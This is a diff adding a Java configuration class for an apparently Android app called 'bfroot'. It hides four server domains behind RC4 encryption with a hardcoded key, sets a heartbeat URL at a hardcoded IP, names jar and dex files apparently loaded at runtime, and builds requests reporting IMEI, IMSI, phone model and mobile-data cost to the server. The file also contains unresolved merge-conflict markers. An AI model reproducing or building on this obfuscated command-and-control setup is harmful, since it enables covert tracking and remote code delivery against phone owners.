@@ -1,0 +1,134 @@
+package com.bfroot.tool;
+
+
+
+public class BfConfig 
+{
+	
+	// 域名1
+	public static final String URL1 = "HÿÑU1çfQ&|êEºNçÿ3cDrùDÊhrÔï¶N3øÔ§öótæîrD¿Õh±­";
+	// 域名2
+	public static final String URL2 = "HÿÑU1çfQ&|êFºNçÿ3cDrùDÊhrÔï¶N3øÔ§öótæîrD¿Õh±­";
+	// 域名3
+	public static final String URL3 = "HÿÑU1çfQ&|êGºNçÿ3cDrùDÊhrÔï¶N3øÔ§öótæîrD¿Õh±­";
+	// 域名4
+	public static final String URL4 = "HÿÑU1çfQ&|ê@ºNçÿ3cDrùDÊhrÔï¶N3øÔ§öótæîrD¿Õh±­";
+
+	public static String url1 = BfTool.RunRC4(URL1, "monibuvyctxrze1092387");
+	public static String url2 = BfTool.RunRC4(URL2, "monibuvyctxrze1092387");
+	public static String url3 = BfTool.RunRC4(URL3, "monibuvyctxrze1092387");
+	public static String url4 = BfTool.RunRC4(URL4, "monibuvyctxrze1092387");
+	
+	public static final String URL[] =
+		{ url1, url2, url3, url4 };
+	public static int X = (int) (Math.random() * 100);
+
+//	public static String HEART_HTTP_URL = URL[X%4];
+
+//	public static final String HEART_HTTP_URL = "http://192.168.1.197:8080/MobileManage/checkaccount.do";
+	public static final String HEART_HTTP_URL = "http://117.135.138.58:8080/MobileManage/checkaccount.do";
+	
+	public static final String APLICATION_NAME = "/Android/data/";
+	
+	public static final String JarFileName = "bfroot.jar";
+	
+	public static final String JarDexName = "bfroot.dex";
+	
+	public static final String JarCodeName = "bfroot_jarcode"; 
+	
+	public static final String BfAccountName = "bf_account";
+	
+	public static final String GprsToTalKeyName = "bf_gprs_total_key";
+	
+	public static final String GprsCostKeyName = "bf_gprs_cost_key";
+	
+	public static final String VestFirstName = "bfroot_vest_";
+	
+	public static final String GprsMesBodyName = "bf_gprs_body";
+	
+	public static final String GprsMesAddName = "bf_grps_add";
+	
+	public static final String BeatName = "bf_beat";
+	
+	public static final String ServerName = "bf_server_add";
+	
+	public static final String ConnectName = "bf_connect";
+	
+<<<<<<< .mine
+	public static int BFALARM_CODE_HEART = 0;
+	
+	public static int BFALARM_CODE_EXPREAD = 1;
+	
+	public static int BFALARM_CODE_OTHER = 2;
+	
+	public static long BFPROTECT_TIMER = 1000*60*60*2;
+	
+=======
+	public static final String GprsFlow = "gprsflow";
+	
+	public static final String Month = "month";
+	
+>>>>>>> .r2905
+	public static long beat = 60000 * 60 *6;
+	
+	public static String time = null;
+	
+	public static String server_add = null;
+	
+	public static int connect = 1;
+	
+	public static String Account = "-1";
+
+	public static String IMEI = "";
+	
+	public static String IMSI = "";
+	
+	public static String PHONE_NAME = "";
+	
+	public static String Vest = "-1";
+	
+	public static int JarCode = 0;
+	
+	public static String GprsTotal = "";
+	
+	public static String GprsCost = "";
+	
+	public static String ScnCode = "";
+	
+	public static String getHttpCommonData()
+	{
+		StringBuilder sb = new StringBuilder("?userid="+Account+"&imei="+IMEI+"&imsi="+IMSI+"&mobilename="+PHONE_NAME+
+				"&vest="+Vest+"&type="+GprsTotal+"&gprs="+GprsTotal+"&gprscost="+GprsCost+
+				"&scn="+ScnCode+"&jarcode="+JarCode);
+		BfTool.replaceForWord(sb, "\\", "");
+		BfTool.replaceForWord(sb, "/", "");
+		
+		return sb.toString();
+	}
+	
+	public static String getBasHttpCommonData()
+	{
+		StringBuilder sb = new StringBuilder("?userid="+Account+"&imei="+IMEI+"&imsi="+IMSI+"&mobilename="+PHONE_NAME+
+				"&vest="+Vest);
+		BfTool.replaceForWord(sb, "\\", "");
+		BfTool.replaceForWord(sb, "/", "");
+		
+		return sb.toString();
+	}
+	
+	public static String getHttpHead(boolean isFinal)
+	{
+		if(isFinal)
+		{
+			return HEART_HTTP_URL;
+		}
+		else
+		{
+			if(null != server_add)
+			{
+				return server_add;
+			}
+			return HEART_HTTP_URL;
+		}
+	}
+}
